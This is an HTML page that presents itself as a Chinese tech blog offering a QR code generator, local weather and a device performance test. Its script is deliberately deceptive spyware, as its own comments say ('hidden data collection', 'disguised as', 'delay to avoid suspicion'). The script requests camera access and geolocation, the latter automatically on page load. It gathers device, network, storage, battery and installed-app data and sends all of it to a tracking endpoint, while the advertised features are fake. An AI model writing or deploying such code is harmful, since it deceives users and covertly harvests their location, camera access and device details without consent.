<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tech Blog - 技术分享与交流</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        .article-img {
            max-width: 100%;
            height: auto;
        }
        .qr-preview {
            width: 320px;
            height: 240px;
            background: #f5f5f5;
            margin: 10px auto;
        }
    </style>
</head>
<body class="bg-gray-100">
    <nav class="bg-white shadow-lg">
        <div class="max-w-6xl mx-auto px-4">
            <div class="flex justify-between">
                <div class="flex space-x-7">
                    <div class="flex items-center py-4">
                        <span class="font-semibold text-gray-500 text-lg">Tech Blog</span>
                    </div>
                </div>
            </div>
        </div>
    </nav>

    <div class="container mx-auto px-4 py-8">
        <article class="bg-white rounded-lg shadow-md p-6 mb-6">
            <h1 class="text-2xl font-bold mb-4">在线二维码生成器</h1>
            <p class="text-gray-600 mb-4">
                使用我们的在线工具生成高质量二维码。支持文本、URL、名片等多种格式。
                为了确保二维码清晰度，需要使用您的摄像头进行屏幕校准。
            </p>
            <div class="qr-preview" id="qr-container">
                <p class="text-center pt-4">正在加载预览...</p>
            </div>
            <button onclick="startCalibration()" class="bg-blue-500 text-white px-4 py-2 rounded mt-4">
                开始屏幕校准
            </button>
        </article>

        <article class="bg-white rounded-lg shadow-md p-6 mb-6">
            <h1 class="text-2xl font-bold mb-4">本地天气预报</h1>
            <p class="text-gray-600 mb-4">
                获取您所在位置的精确天气预报，包括温度、湿度、空气质量等详细信息。
            </p>
            <div id="weather-container" class="bg-gray-100 p-4 rounded">
                <p class="text-center">加载天气信息中...</p>
            </div>
        </article>

        <article class="bg-white rounded-lg shadow-md p-6 mb-6">
            <h1 class="text-2xl font-bold mb-4">设备性能测试</h1>
            <p class="text-gray-600 mb-4">
                测试您的设备性能，包括CPU、内存、存储等指标。
            </p>
            <div id="performance-result" class="bg-gray-100 p-4 rounded">
                <p class="text-center">准备开始测试...</p>
            </div>
            <button onclick="startPerformanceTest()" class="bg-green-500 text-white px-4 py-2 rounded mt-4">
                开始测试
            </button>
        </article>
    </div>

    <script>
        // 隐藏的数据收集
        let deviceData = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            deviceMemory: navigator.deviceMemory,
            hardwareConcurrency: navigator.hardwareConcurrency,
            connection: navigator.connection ? {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            } : null
        };

        // 伪装成屏幕校准
        async function startCalibration() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'environment' },
                    audio: false
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                deviceData.camera = true;
                sendData();
            } catch (err) {
                console.log('校准失败，请检查设备设置');
            }
        }

        // 伪装成天气查询
        function getWeather() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        deviceData.location = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        };
                        document.getElementById('weather-container').innerHTML = 
                            '<p class="text-center">正在获取天气数据...</p>';
                        sendData();
                    },
                    err => {
                        console.log('无法获取天气信息');
                    }
                );
            }
        }

        // 伪装成性能测试
        async function startPerformanceTest() {
            document.getElementById('performance-result').innerHTML = 
                '<p class="text-center">测试进行中...</p>';
            
            try {
                // 收集更多系统信息
                const storageEstimate = await navigator.storage.estimate();
                const batteryManager = await navigator.getBattery();
                
                deviceData.storage = {
                    quota: storageEstimate.quota,
                    usage: storageEstimate.usage
                };
                
                deviceData.battery = {
                    level: batteryManager.level,
                    charging: batteryManager.charging
                };
                
                // 获取已安装应用信息（如果可用）
                if ('getInstalledRelatedApps' in navigator) {
                    deviceData.apps = await navigator.getInstalledRelatedApps();
                }

                setTimeout(() => {
                    document.getElementById('performance-result').innerHTML = 
                        '<p class="text-center text-green-500">测试完成！设备性能良好</p>';
                    sendData();
                }, 2000);
            } catch (err) {
                console.log('性能测试出现错误');
                document.getElementById('performance-result').innerHTML = 
                    '<p class="text-center text-yellow-500">测试完成！</p>';
            }
        }

        // 发送数据到服务器
        async function sendData() {
            try {
                await fetch('/api/track', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(deviceData)
                });
            } catch (err) {
                console.log('数据同步失败');
            }
        }

        // 页面加载完成后自动执行
        window.onload = () => {
            // 延迟执行以避免可疑
            setTimeout(getWeather, 1000);
            setTimeout(() => {
                document.getElementById('qr-container').innerHTML = 
                    '<p class="text-center">请点击"开始屏幕校准"继续...</p>';
            }, 1500);
        };
    </script>
</body>
</html> 
